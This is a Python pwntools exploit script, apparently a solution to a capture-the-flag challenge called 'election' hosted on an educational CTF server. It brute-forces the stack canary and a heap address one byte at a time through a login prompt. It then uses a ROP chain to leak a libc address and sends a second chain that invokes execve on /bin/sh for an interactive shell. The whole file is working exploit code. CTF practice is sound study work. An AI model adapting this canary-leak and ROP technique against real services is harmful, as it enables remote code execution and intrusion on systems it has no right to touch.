from pwn import *

context.binary = './election'
elf = ELF('./libc.so')
r = remote('edu-ctf.csie.org', 10180)
#r = process('./election')

def login(token):
    r.sendlineafter('>', '1')
    r.sendafter('Token: ', token)

def register(token):
    r.sendlineafter('>', '2')
    r.sendafter('Register an anonymous token: ', token)

def handler():
    r.sendlineafter('>', '3')

def vote(choice):
    r.sendlineafter('>', '1')
    r.sendafter('Your choice [0~9]: ', str(choice))

def say(idx, msg):
    r.sendlineafter('>', '2')
    r.sendlineafter('To [0~9]: ', str(idx))
    r.sendlineafter('Message: ', msg)

def ret():
    r.sendlineafter('>', '3')

leak = ''
for i in range(16):
    for j in range(0xff):
        guess = chr(j)
        payload = '\x00' * 0xb8 + leak + guess
        login(payload)
        res = r.recv(20)
        if 'Invalid token.' not in res:
            ret()
            leak += guess
            break

canary = u64(leak[:8])
heap = u64(leak[8:]) - 0x1140
success('canary: {}, heap: {}'.format(hex(canary), hex(heap)))

for i in range(51):
    register('\x00')
    login('\x00')
    for j in range(5):
        vote(0)
    ret()

init = 0x8f0 + heap
read = 0x980 + heap
read_int = 0xb92 + heap
banner = 0xc67 + heap
main = 0xffb + heap
voting = 0xd74 + heap
puts_plt = 0x940 + heap
buf = 0x202160 + heap
puts_got = 0x201f90 + heap
msg_stack = 0x7fff4d0c6ae0
voting_ret = 0x7fff4d0c6bd8 

# leave; ret
leave_ret = heap + 0xff9
# mov r15; mov r14; ... in csu
csu_mov = 0x1180 + heap
# pop rbx; pop rbp ; pop r12; pop r13; pop r14; pop r15; ret;
csu_pop = 0x119a + heap
# ret
ret_ = 0x11a4 + heap
# pop rdi ; ret
pop_rdi = heap + 0x11a3

success('ret_: {}, pop_rdi: {}, buf: {}'.format(hex(ret_), hex(pop_rdi), hex(buf)))

payload = flat(
    ret_,
    pop_rdi,
    puts_got,
    puts_plt,
    csu_pop,
    0,
    1,
    buf + 8,
    0,
    buf + 8 * 22,
    0x100,
    csu_mov,
    0, 0, 0, 0, 0, 0, 0,
    pop_rdi,
    0,
    read
)

register(payload)
#pause()
login(payload)
say(0, 'a' * 232 + p64(canary) + p64(buf) + p64(leave_ret))
ret()

res = r.recvuntil('\x7f')
res = res[len(res) - 6:] + '\0\0'
elf.address = u64(res) - elf.sym.puts
success('libc base: {}'.format(hex(elf.address)))

# pop rcx ; ret
pop_rcx = elf.address + 0x3eb0b
# pop rsi ; ret
pop_rsi = elf.address + 0x23e6a
# pop rdx ; ret
pop_rdx = elf.address + 0x1b96 
# pop rax ; ret
pop_rax = elf.address + 0x439c8
# syscall
syscall = elf.address + 0x13c0
bin_sh = elf.search('/bin/sh').next()
one_gadget = elf.address + 0x4f2c5

payload = flat(
	pop_rdi,
    bin_sh,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3b,
    syscall
)

success('pop_rdi: {}, /bin/sh: {}, system: {}'.format(hex(pop_rdi), hex(bin_sh), hex(elf.sym.system)))
r.send(payload)

r.interactive()
